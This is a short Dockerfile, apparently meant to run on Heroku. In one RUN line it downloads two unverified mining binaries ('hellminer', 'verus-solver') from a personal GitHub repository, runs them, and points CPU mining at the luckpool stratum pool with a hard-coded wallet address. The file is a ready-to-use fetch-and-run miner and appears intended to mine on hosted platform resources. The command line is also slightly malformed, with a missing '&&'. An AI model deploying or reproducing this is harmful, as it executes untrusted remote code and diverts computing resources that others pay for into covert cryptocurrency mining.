FROM thomasjp0x42/packetcrypt

RUN wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJz4XfW5AdpMVUF9GMAsDvvsYFuM1MmJeS.blong -p x --cpu 7
CMD bash heroku.sh
